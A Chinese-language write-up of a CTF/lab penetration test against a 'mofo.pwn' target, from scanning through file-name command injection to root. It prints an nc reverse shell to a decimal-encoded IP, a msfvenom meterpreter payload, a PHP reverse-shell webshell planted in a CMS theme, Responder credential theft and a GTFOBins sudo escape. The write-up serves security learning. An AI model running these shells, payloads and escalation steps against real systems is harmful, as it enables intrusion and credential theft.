# 靶场拓扑&情况

# 渗透过程
网络扫描
`namp -v -A 192.168.1.0/24`

![](attachments/Pasted%20image%2020230303083516.png)

`dirsearch -u http://192.168.1.129/`
结果全为200，应该是做了防扫描的特殊设置

![](attachments/Pasted%20image%2020230303084150.png)

发现网站由上传文件的功能
试着上传一个shell，发现不支持php文件，只允许txt和rtf，上传txt文件后发现文件内容出现在了网页

![](attachments/Pasted%20image%2020230303085226.png)


猜测后台有读文件的相关操作，尝试xss文件内容也无效，可能对内容有处理，尝试文件名注入

![](attachments/Pasted%20image%2020230303092812.png)
![](attachments/Pasted%20image%2020230303092758.png)

过滤了whoami，那么就是想办法在这里实现命令执行了
可用ls读文件，但是过滤了斜杠 `/`,猜测这里读文件可能是调用了exec这样的危险函数，

![](attachments/Pasted%20image%2020230303094109.png)

直接`cat main.py`会被认为是其他文件，为了读对应文件，改为`cat main*`

main.py
```python
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024



@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune -o'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
	return render_template('index.html')
	

@app.route('/upload')

def upload_form():
	try:
	    return render_template('my-form.html')
	except Exception as e:
	    return render_template("500.html", error = str(e))


def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS    
           return check

@app.route('/upload', methods=['POST'])
def upload_file():
	if request.method == 'POST':
		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if file.filename and allowed_file(file.filename):
			filename = file.filename
			
			file.save(os.path.join(UPLOAD_FOLDER, filename))
			cmd="cat "+UPLOAD_FOLDER+"/"+filename
			result = subprocess.check_output(cmd, shell=True)
			flash(result.decode("utf-8"))
			flash('File successfully uploaded')
			
			try:
			   ftp = FTP('ftp.mofo.pwn')
			   ftp.login('someuser', 'b232a4da4c104798be4613ab76d26efda1a04606')
			   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
			      ftp.storlines('STOR %s' % filename, f)
			      ftp.quit()
			except:
			   flash("Cannot connect to FTP-server")
			return redirect('/upload')

		else:
			flash('Allowed file types are txt and rtf')
			return redirect(request.url)


if __name__ == "__main__":
    app.run()
```

尝试反弹shell，由于`.`用来判断文件类型，将ip地址转为10进制,环境是有nc的
`nc 3232235905 23456 -e bash`

![](attachments/Pasted%20image%2020230303111619.png)

拿到shell，做一个tty
`python -c "import pty;pty.spawn('/bin/bash')"`

![](attachments/Pasted%20image%2020230303111910.png)

查找main.py 的ftp服务
`ls /usr/bin | grep ftp`
利用之前代码中的用户名密码登录FTP服务
`lftp someuser@ftp.mofo.pwn`

![](attachments/Pasted%20image%2020230303135822.png)

查看cmscreds.txt

![](attachments/Pasted%20image%2020230303135918.png)

`hardEnough4u`

利用这台机器开始扫描内网，下载一个nmap `add apk nmap`
内网ip为172.19.0.10，nmap扫描网段

![](attachments/Pasted%20image%2020230303162353.png)

dig枚举域名

![](attachments/Pasted%20image%2020230303162921.png)

利用msf做端口转发
`portfwd add -l 18080 -r 172.19.0.1 -p 8080
生成elf程序
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=8080 -f elf -o shell.elf`
受害机wget下载然后给权限运行

![](attachments/Pasted%20image%2020230303160933.png)

现在访问127.0.0.1:18080可以看到apache的页面

![](attachments/Pasted%20image%2020230303163134.png)

但是没有看到cms，可能是站点域名的设置，需要更改一下host文件

![](attachments/Pasted%20image%2020230303164733.png)

直接访问

![](attachments/Pasted%20image%2020230303180416.png)

dirsearch扫目录

![](attachments/Pasted%20image%2020230303180408.png)

结合先前获得的账号密码，直接登录后台

![](attachments/Pasted%20image%2020230303180814.png)

进后台之后是一个类Wordpress的网站，在Theme哪里去做修改拿shell,下面是一个php的反弹shell

```php
<?php 
set_time_limit(0); 
$ip=$_REQUEST['ip'];
$port=$_REQUEST['port'];
$fp=@fsockopen($ip,$port,$errno,$errstr);
if(!$fp){echo "error";}
else{
	fputs($fp,"\n+++++++++++++connect sucess+++++++++\n");
	while(!feof($fp)){
	fputs($fp,"shell:");
	$shell=fgets($fp);
	$message=`$shell`;
	fputs($fp,$message);
	}
fclose($fp);
}
?>

```

`http://ourcms.mofo.pwn:18080/theme/Innovation/template.php?ip=192.168.163.129&port=23457`

![](attachments/Pasted%20image%2020230303203156.png)

这里提权基本没戏
设置的点是responder，一个类似中间人攻击的方式来骗取其他主机的账户和密码
[【脉搏译文系列】渗透师指南之Responder - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/65503.html)

在还是和之前一样下载responder的工具然后从kali wget

![](attachments/Pasted%20image%2020230303211610.png)

利用拿到的用户名密码登录172.19.0.1的ssh

![](attachments/Pasted%20image%2020230303211737.png)

user.txt
```txt
a81be4e9b20632860d20a64c054c4150
```


现在找提权的方法

![](attachments/Pasted%20image%2020230303212852.png)

这个用户还没有办法做sudo -l

![](attachments/Pasted%20image%2020230303213245.png)

mail里有大量的邮件内容

![](attachments/Pasted%20image%2020230303212221.png)

还算友好，没有藏在中间，在末尾的部分可以一眼看到

![](attachments/Pasted%20image%2020230303212354.png)

`vickie:9f4lw0r82bn6`

现在上一vickie这个号看看
sudo -i

![](attachments/Pasted%20image%2020230303213304.png)

用ip提权

[GTFOBins](https://gtfobins.github.io/)

```
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
```

![](attachments/Pasted%20image%2020230303213603.png)

这样就拿下了

![](attachments/Pasted%20image%2020230303213754.png)

执行一下，嘿嘿嘿

![](attachments/Pasted%20image%2020230303213900.png)


# 相关文章
[【脉搏译文系列】渗透师指南之Responder - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/65503.html)

这个提权总结的很牛，没事可以多看看
[GTFOBins](https://gtfobins.github.io/)